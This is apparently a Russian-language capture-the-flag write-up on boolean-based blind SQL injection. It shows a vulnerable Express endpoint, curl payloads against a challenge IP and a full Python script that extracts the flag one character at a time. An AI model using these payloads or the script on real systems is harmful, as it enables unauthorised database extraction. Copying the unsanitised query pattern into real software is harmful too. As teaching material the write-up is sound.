**Задание:**

Флаг находится в таблице БД, но запрос к ней может ответить только false или true.

Адрес api: http://31.207.77.216:4004/check?number=1

---
**Решение:**

Имеем следующий код:

```js
app.get('/check', (req, res) => {
  const { number } = req.query;
  const query = `SELECT count(*) as count FROM flag WHERE ${number}`;

  db.get(query, (err, row) => {
    if (err) {
      return res.json({ success: false });
    }
    
    const hasRecords = row && row.count > 0;
    res.json({ success: hasRecords ? true : false });
  });
});
```

Это задача на слепую SQL-инъекцию (Boolean-based Blind SQL Injection). Анализируя код, видим:

- Параметр `number` вставляется прямо в SQL-запрос без проверки.
- Сервер возвращает только `true` или `false` в зависимости от того, есть ли записи.
- Нужно извлечь флаг из таблицы `flag`.

Запрос для получения структуры таблицы:

```shell
curl "http://31.207.77.216:4004/check?number=1+AND+(SELECT+flag+FROM+flag)+IS+NOT+NULL"
{"success":true} 
```

Определение длины флага:

```shell
curl "http://31.207.77.216:4004/check?number=1+AND+(SELECT+LENGTH(flag)+FROM+flag)=36"
{"success":true} 
```

Скрипт для посимвольного извлечения флага:

```python                                                                 
import requests
import string

url = "http://31.207.77.216:4004/check"

def check(payload):
    params = {"number": payload}
    r = requests.get(url, params=params)
    return r.json()["success"]

# Узнаем длину флага
length = 0
for i in range(1, 100):
    payload = f"1 AND (SELECT LENGTH(flag) FROM flag)={i}"
    if check(payload):
        length = i
        break

print(f"Длина флага: {length}\n")

# Извлекаем флаг
flag = ""
charset = string.ascii_letters + string.digits + "{}_-!"

for position in range(1, length + 1):
    for char in charset:
        payload = f"1 AND (SELECT SUBSTR(flag,{position},1) FROM flag)='{char}'"
        if check(payload):
            flag += char
            print(f"Найден символ: {char}, текущий флаг: {flag}")
            break

print(f"\nПолный флаг: {flag}")
```